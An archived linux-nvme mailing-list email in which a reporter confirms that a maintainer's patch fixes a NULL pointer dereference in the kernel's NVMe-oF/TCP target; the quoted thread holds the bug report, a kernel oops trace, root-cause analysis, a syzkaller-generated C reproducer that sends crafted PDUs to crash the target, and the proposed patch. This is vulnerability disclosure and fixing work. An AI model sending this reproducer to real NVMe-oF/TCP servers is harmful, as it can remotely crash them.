Return-Path: <linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id B806CC4332F
	for <linux-nvme@archiver.kernel.org>; Thu,  9 Nov 2023 13:18:17 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Type:Cc:To:Subject:
	Message-ID:Date:From:In-Reply-To:References:MIME-Version:Reply-To:
	Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
	Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
	bh=7Sm9PXS6tPR3lK7Jc4KjMaDPJxlcm9v3JVbJITO4vhc=; b=oridPFhDqQ+uC9Iq/PluoPVn5V
	QGQDOhaTnQpYrMCARqOA/KQthoxy3ih7+i4wePJjTyAoENP4mw6dkWvYPiA6RTl7fdEG3AohizhR8
	ylCcLfeWBqtfJUpUKCfovwjQOfumIyUD+RDCStU4gmEEJknyFhFU8VZd5B1oAJm5pJOdkIV6Eg6jX
	oWrHH7MqpekPjh0eMNNY0TAj6TvCR+lxSeqsBz8zp2jz6j7V3I4wb4i92nkX/lmZvx4heYFjPRhg5
	5PyT0/V68HU+VvEOH4rPSHRE9EGSTJBTaoxdBtGtpvL6JNEF90632LVCsP7/O/owgBpguyUI7r+Pr
	BXkz2xgw==;
Received: from localhost ([::1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.96 #2 (Red Hat Linux))
	id 1r14vE-006NVs-2v;
	Thu, 09 Nov 2023 13:18:12 +0000
Received: from mail-ed1-x529.google.com ([2a00:1450:4864:20::529])
	by bombadil.infradead.org with esmtps (Exim 4.96 #2 (Red Hat Linux))
	id 1r14vB-006NUo-1c
	for linux-nvme@lists.infradead.org;
	Thu, 09 Nov 2023 13:18:11 +0000
Received: by mail-ed1-x529.google.com with SMTP id 4fb4d7f45d1cf-52bd9ddb741so1345920a12.0
        for <linux-nvme@lists.infradead.org>; Thu, 09 Nov 2023 05:18:06 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1699535885; x=1700140685; darn=lists.infradead.org;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=7Sm9PXS6tPR3lK7Jc4KjMaDPJxlcm9v3JVbJITO4vhc=;
        b=IuXuYlrJJVVuXBh5X0y+sTpKpjcGYBHJip1W05WxwLEMdC4H6AptzRIM1hVImDzE+2
         5xP0tU9M5Ni8x4gCYdRcIM4rWn0/LAgCRRbAjYi9RoUqezcxULX49Qm2s/V5P43e5QdO
         ASWB3qj/NWRVED5EZjx2ALngP+yUVP24yfvYYRIy3l+x//BAZCTktXP+QV95lH3TwaP2
         LxsJy2DZUBlFrhcLgYf/p7B/kp46Wxuq8F3BsPswA9EGrqb20nQTetjqn0KXauOGU4s+
         yPMqkDMNsOMZywRCFf60QfuxSq9mW8rwYrB/KbeDDp/vz5Zh5SCFLBXqavToIny4RiPN
         dOrQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1699535885; x=1700140685;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=7Sm9PXS6tPR3lK7Jc4KjMaDPJxlcm9v3JVbJITO4vhc=;
        b=bL5n/svVEZTy29LNqPowmkGMmvq6nY43KFsz7xa9Q0WckCDfUv2GkZ7t5/kTqz5rY2
         y0nChWgdx9Az/Whsqb5IGyLjBSHjGmvSsEoxDlM06/29dI8KoZA5McgvjOrmLjfvSI36
         /40TPTBRcmVLLRM94sjASy9g5nQGsQyjmueez3zrEKnAtFal0myHES0WoCBsu29TNewl
         1TeKGgG8Sq5LuiQ73iU6R7i0nSFVzqZ5o4o/2A9yhGdOFHPbf/deZUw2rlvwMTDsEFjS
         zBMj+Rd9+csEZ5P/uLpQkwd5sMjhcJaJPyeP7UMyBccUBDjSbR83ijRZeTDu1C0SA+ib
         qrtw==
X-Gm-Message-State: AOJu0YwpnHJsopPNgbIA8Z37YDYT9Dvx/4uJgrUZP8jh0CG+eZifGwaY
	xoOirwjC4/nJ/T8456SnJctQt3sqrtDWqubLrnHahv7RvYw=
X-Google-Smtp-Source: AGHT+IFxYeYsfpoKAK+3UUdl8W5a5Ks8fNK3XSFIYTZeQOGVRDT8aVNCy8bEhvYrUxXJt5tYgDYvq93wgD/+q5GRf5k=
X-Received: by 2002:a17:907:2cc2:b0:9be:3c7e:7f38 with SMTP id
 hg2-20020a1709072cc200b009be3c7e7f38mr4006831ejc.10.1699535884740; Thu, 09
 Nov 2023 05:18:04 -0800 (PST)
MIME-Version: 1.0
References: <CAK5usQuREC_n2dyTrv740v0PiddP2sdKKBqJG3kwbogZh+pv1Q@mail.gmail.com>
 <e04cadc4-9f52-48e1-9e4e-90b8beb020ce@nvidia.com>
In-Reply-To: <e04cadc4-9f52-48e1-9e4e-90b8beb020ce@nvidia.com>
From: Alon Zahavi <zahavi.alon@gmail.com>
Date: Thu, 9 Nov 2023 15:17:53 +0200
Message-ID: <CAK5usQuzTseKP+pra0-Noy3vAF1j2oRF4pzprrYyA07EM=-E3g@mail.gmail.com>
Subject: Re: [Bug Report] NVMe-oF/TCP - NULL Pointer Dereference in `__nvmet_req_complete`
To: Chaitanya Kulkarni <chaitanyak@nvidia.com>
Cc: "linux-nvme@lists.infradead.org" <linux-nvme@lists.infradead.org>, Sagi Grimberg <sagi@grimberg.me>, 
	Christoph Hellwig <hch@lst.de>
Content-Type: text/plain; charset="UTF-8"
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20231109_051809_544075_FBF0E1C4 
X-CRM114-Status: GOOD (  39.17  )
X-BeenThere: linux-nvme@lists.infradead.org
X-Mailman-Version: 2.1.34
Precedence: list
List-Id: <linux-nvme.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-nvme/>
List-Post: <mailto:linux-nvme@lists.infradead.org>
List-Help: <mailto:linux-nvme-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=subscribe>
Sender: "Linux-nvme" <linux-nvme-bounces@lists.infradead.org>
Errors-To: linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org

On Tue, 7 Nov 2023 at 12:03, Chaitanya Kulkarni <chaitanyak@nvidia.com> wrote:
>
> On 11/6/23 05:41, Alon Zahavi wrote:
> > # Bug Overview
> >
> > ## The Bug
> > A null-ptr-deref in `__nvmet_req_complete`.
> >
> > ## Bug Location
> > `drivers/nvme/target/core.c` in the function `__nvmet_req_complete`.
> >
> > ## Bug Class
> > Remote Denial of Service
> >
> > ## Disclaimer:
> > This bug was found using Syzkaller with NVMe-oF/TCP added support.
> >
> > # Technical Details
> >
> > ## Kernel Report - NULL Pointer Dereference
> >
> > BUG: kernel NULL pointer dereference, address: 0000000000000020
> > #PF: supervisor read access in kernel mode
> > #PF: error_code(0x0000) - not-present page
> > PGD 0 P4D 0
> > Oops: 0000 [#1] PREEMPT SMP NOPTI
> > CPU: 2 PID: 31 Comm: kworker/2:0H Kdump: loaded Not tainted 6.5.0-rc1+ #5
> > Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop
> > Reference Platform, BIOS 6.00 11/12/2020
> > Workqueue: nvmet_tcp_wq nvmet_tcp_io_work
> > RIP: 0010:__nvmet_req_complete+0x33/0x350 drivers/nvme/target/core.c:740
> > Code: 41 57 41 56 41 55 41 54 49 89 fc 53 89 f3 48 83 ec 08 66 89 75
> > d6 e8 dc cd 1a ff 4d 8b 6c 24 10 bf 01 00 00 00 4d 8b 74 24 20 <45> 0f
> > b6 7d 20 44 89 fe e8 60 c8 1a ff 41 80 ff 01 0f 87 ef 75 96
> > RSP: 0018:ffffc90000527c00 EFLAGS: 00010293
> > RAX: 0000000000000000 RBX: 0000000000004002 RCX: 0000000000000000
> > RDX: ffff888100c74880 RSI: ffffffff82170d04 RDI: 0000000000000001
> > RBP: ffffc90000527c30 R08: 0000000000000001 R09: 0000000000000000
> > R10: 0000000000000000 R11: 0000000000000000 R12: ffff8881292a13e8
> > R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
> > FS:  0000000000000000(0000) GS:ffff888233f00000(0000) knlGS:0000000000000000
> > CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> > CR2: 0000000000000020 CR3: 0000000003c6a005 CR4: 00000000007706e0
> > PKRU: 55555554
> > Call Trace:
> >   <TASK>
> >   nvmet_req_complete+0x2c/0x40 drivers/nvme/target/core.c:761
> >   nvmet_tcp_handle_h2c_data_pdu drivers/nvme/target/tcp.c:981
> >   nvmet_tcp_done_recv_pdu drivers/nvme/target/tcp.c:1020
> >   nvmet_tcp_try_recv_pdu+0x1132/0x1310 drivers/nvme/target/tcp.c:1182
> >   nvmet_tcp_try_recv_one drivers/nvme/target/tcp.c:1306
> >   nvmet_tcp_try_recv drivers/nvme/target/tcp.c:1338
> >   nvmet_tcp_io_work+0xe6/0xd90 drivers/nvme/target/tcp.c:1388
> >   process_one_work+0x3da/0x870 kernel/workqueue.c:2597
> >   worker_thread+0x67/0x640 kernel/workqueue.c:2748
> >   kthread+0x164/0x1b0 kernel/kthread.c:389
> >   ret_from_fork+0x29/0x50 arch/x86/entry/entry_64.S:308
> >   </TASK>
> >
> > ## Description
> >
> > ### Tracing The Bug
> > The bug occurs during the execution of __nvmet_req_complete. Looking
> > in the report generated by syzkaller, we can see the exact line of
> > code that triggers the bug.
> >
> > Code Block 1:
> > ```
> > static void __nvmet_req_complete(struct nvmet_req *req, u16 status)
> > {
> > struct nvmet_ns *ns = req->ns;
> >
> > if (!req->sq->sqhd_disabled) // 1
> > nvmet_update_sq_head(req);
> >
> >    ..
> > }
> > ```
> >
> > In the first code block, we can see that there is a dereference of
> > `req->sq` when checking the condition `if (!req->sq->sqhd_disabled)`.
> > However, when executing the reproducer, `req->sq` is NULL. When trying
> > to dereference it, the kernel triggers a panic.
> >
> > ## Root Cause
> > `req` is initialized during `nvmet_req_init`. However, the sequence
> > that leads into `__nvmet_req_complete` does not contain any call for
> > `nvmet_req_init`, thus crashing the kernel with NULL pointer
> > dereference. This flow of execution can also create a situation where
> > an uninitialized memory address will be dereferenced, which has
> > undefined behaviour.
> >
> > ## Reproducer
> > I am adding a reproducer generated by Syzkaller with some
> > optimizations and minor changes.
> >
> > ```
> > // autogenerated by syzkaller (<https://github.com/google/syzkaller>)
> >
> > #define _GNU_SOURCE
> >
> > #include <endian.h>
> > #include <errno.h>
> > #include <fcntl.h>
> > #include <sched.h>
> > #include <stdarg.h>
> > #include <stdbool.h>
> > #include <stdint.h>
> > #include <stdio.h>
> > #include <stdlib.h>
> > #include <string.h>
> > #include <sys/mount.h>
> > #include <sys/prctl.h>
> > #include <sys/resource.h>
> > #include <sys/stat.h>
> > #include <sys/syscall.h>
> > #include <sys/time.h>
> > #include <sys/types.h>
> > #include <sys/wait.h>
> > #include <unistd.h>
> >
> > #include <linux/capability.h>
> >
> > uint64_t r[1] = {0xffffffffffffffff};
> >
> > void loop(void)
> > {
> >    intptr_t res = 0;
> >    res = syscall(__NR_socket, /*domain=*/2ul, /*type=*/1ul, /*proto=*/0);
> >    if (res != -1)
> >      r[0] = res;
> >    *(uint16_t*)0x20000100 = 2;
> >    *(uint16_t*)0x20000102 = htobe16(0x1144);
> >    *(uint32_t*)0x20000104 = htobe32(0x7f000001);
> >    syscall(__NR_connect, /*fd=*/r[0], /*addr=*/0x20000100ul, /*addrlen=*/0x10ul);
> >    *(uint8_t*)0x200001c0 = 0;
> >    *(uint8_t*)0x200001c1 = 0;
> >    *(uint8_t*)0x200001c2 = 0x80;
> >    *(uint8_t*)0x200001c3 = 0;
> >    *(uint32_t*)0x200001c4 = 0x80;
> >    *(uint16_t*)0x200001c8 = 0;
> >    *(uint8_t*)0x200001ca = 0;
> >    *(uint8_t*)0x200001cb = 0;
> >    *(uint32_t*)0x200001cc = 0;
> >    memcpy((void*)0x200001d0,
> >           "\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf"
> >           "\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf"
> >           "\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35"
> >           "\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86"
> >           "\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf"
> >           "\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf"
> >           "\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86",
> >           112);
> >    syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x200001c0ul, /*len=*/0x80ul,
> >            /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
> >    *(uint8_t*)0x20000080 = 6;
> >    *(uint8_t*)0x20000081 = 3;
> >    *(uint8_t*)0x20000082 = 0x18;
> >    *(uint8_t*)0x20000083 = 0x1c;
> >    *(uint32_t*)0x20000084 = 2;
> >    *(uint16_t*)0x20000088 = 0x5d;
> >    *(uint16_t*)0x2000008a = 3;
> >    *(uint32_t*)0x2000008c = 0;
> >    *(uint32_t*)0x20000090 = 7;
> >    memcpy((void*)0x20000094, "\\x83\\x9e\\x4f\\x1a", 4);
> >    syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x20000080ul, /*len=*/0x80ul,
> >            /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
> > }
> > int main(void)
> > {
> >    syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul,
> >            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
> >    syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul,
> >            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
> >    syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul,
> >            /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
> >    loop();
> >    return 0;
> > }
> > ```
> >
> >
>
>
> I'm not able to reproduce the problem [1], all I get is following error
> once I setup a target with nvmeof TCP and run the above program :-
>
> [22180.507777] nvmet_tcp: failed to allocate queue, error -107
>
> Can you try following patch? full disclosure I've compile tested
> and built this patch based on code inspection only :-
>
> diff --git a/drivers/nvme/target/tcp.c b/drivers/nvme/target/tcp.c
> index 92b74d0b8686..e35e8d79c66a 100644
> --- a/drivers/nvme/target/tcp.c
> +++ b/drivers/nvme/target/tcp.c
> @@ -992,12 +992,26 @@ static int nvmet_tcp_handle_h2c_data_pdu(struct
> nvmet_tcp_queue *queue)
>          }
>
>          if (le32_to_cpu(data->data_offset) != cmd->rbytes_done) {
> +               struct nvme_command *nvme_cmd = &queue->pdu.cmd.cmd;
> +               struct nvmet_req *req = &cmd->req;
> +
>                  pr_err("ttag %u unexpected data offset %u (expected %u)\n",
>                          data->ttag, le32_to_cpu(data->data_offset),
>                          cmd->rbytes_done);
> -               /* FIXME: use path and transport errors */
> -               nvmet_req_complete(&cmd->req,
> -                       NVME_SC_INVALID_FIELD | NVME_SC_DNR);
> +
> +               memcpy(req->cmd, nvme_cmd, sizeof(*nvme_cmd));
> +               if (unlikely(!nvmet_req_init(req, &queue->nvme_cq,
> +                               &queue->nvme_sq, &nvmet_tcp_ops))) {
> +                       pr_err("failed cmd %p id %d opcode %d, data_len:
> %d\n",
> +                               req->cmd, req->cmd->common.command_id,
> +                               req->cmd->common.opcode,
> + le32_to_cpu(req->cmd->common.dptr.sgl.length));
> +                       nvmet_tcp_handle_req_failure(queue, cmd, req);
> +               } else {
> +                       /* FIXME: use path and transport errors */
> +                       nvmet_req_complete(&cmd->req,
> +                                       NVME_SC_INVALID_FIELD |
> NVME_SC_DNR);
> +               }
>                  return -EPROTO;
>          }
>
> I'll try to reproduce these problems, else will ping you offline...
>
> -ck
>
> [1]
> nvme (nvme-6.7) # nvme list
> Node                  Generic               SN
> Model                                    Namespace
> Usage                      Format           FW Rev
> --------------------- --------------------- --------------------
> ---------------------------------------- ---------
> -------------------------- ---------------- --------
> /dev/nvme1n1          /dev/ng1n1            408a5a6db1e890944886
> Linux                                    1           1.07  GB / 1.07
> GB    512   B +  0 B   6.6.0nvm
> /dev/nvme0n1          /dev/ng0n1            foo QEMU NVMe
> Ctrl                           1           1.07  GB / 1.07  GB    512
> B +  0 B   1.0
> nvme (nvme-6.7) # cat /sys/kernel/config/nvmet/ports/0/addr_trtype
> tcp
> nvme (nvme-6.7) # cat /sys/kernel/config/nvmet/ports/0/addr_traddr
> 127.0.0.1
> nvme (nvme-6.7) # ./a.out
> nvme (nvme-6.7) # dmesg  -c
> [22106.230605] loop: module loaded
> [22106.246494] run blktests nvme/004 at 2023-11-07 01:58:06
> [22106.279272] loop0: detected capacity change from 0 to 2097152
> [22106.294374] nvmet: adding nsid 1 to subsystem blktests-subsystem-1
> [22106.302392] nvmet_tcp: enabling port 0 (127.0.0.1:4420)
> [22106.320146] nvmet: creating nvm controller 1 for subsystem
> blktests-subsystem-1 for NQN
> nqn.2014-08.org.nvmexpress:uuid:0f01fb42-9f7f-4856-b0b3-51e60b8de349.
> [22106.320859] nvme nvme1: creating 48 I/O queues.
> [22106.326035] nvme nvme1: mapped 48/0/0 default/read/poll queues.
> [22106.336551] nvme nvme1: new ctrl: NQN "blktests-subsystem-1", addr
> 127.0.0.1:4420
> [22180.507777] nvmet_tcp: failed to allocate queue, error -107
>
>

I tested the patch and it does mitigate the problem.

Thanks,
Alon.

